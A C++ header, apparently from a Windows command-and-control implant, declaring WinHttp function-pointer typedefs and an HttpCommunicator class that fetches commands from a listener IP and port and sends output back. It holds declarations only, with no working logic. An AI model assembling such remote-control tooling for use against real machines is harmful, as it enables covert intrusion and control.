#include "Communicator.h"
#include <vector>
#include <string>
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include "core.h"

#pragma once
typedef HINTERNET (WINAPI*  WinHttpOpenFunctionPointer)(
	LPCWSTR pszAgentW,
	DWORD   dwAccessType,
	LPCWSTR pszProxyW,
	LPCWSTR pszProxyBypassW,
	DWORD   dwFlags
);

typedef HINTERNET(WINAPI* WinHttpConnectFunctionPointer)(
	HINTERNET     hSession,
	LPCWSTR       pswzServerName,
	INTERNET_PORT nServerPort,
	DWORD         dwReserved
);

typedef HINTERNET(WINAPI* WinHttpOpenRequestFunctionPointer)(
	HINTERNET hConnect,
	LPCWSTR   pwszVerb,
	LPCWSTR   pwszObjectName,
	LPCWSTR   pwszVersion,
	LPCWSTR   pwszReferrer,
	LPCWSTR* ppwszAcceptTypes,
	DWORD     dwFlags
);

typedef BOOL(WINAPI* WinHttpSendRequestFunctionPointer)(
	HINTERNET hRequest,
	LPCWSTR   lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength,
	DWORD     dwTotalLength,
	DWORD_PTR dwContext
);

typedef BOOL(WINAPI* WinHttpReceiveResponseFunctionPointer)(
	HINTERNET hRequest,
	LPVOID    lpReserved
);

typedef BOOL(WINAPI* WinHttpReadDataFunctionPointer)(
	HINTERNET hRequest,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
);

typedef BOOL(WINAPI* WinHttpSetOptionFunctionPointer)(
	HINTERNET hInternet,
	DWORD     dwOption,
	LPVOID    lpBuffer,
	DWORD     dwBufferLength
);

class HttpCommunicator : public Communicator
{
public:
	static HttpCommunicator* communicator;

	HttpCommunicator(std::string listenerIp, int listenerPort);

	void get_commands();

	void send_output(std::string msg);
};

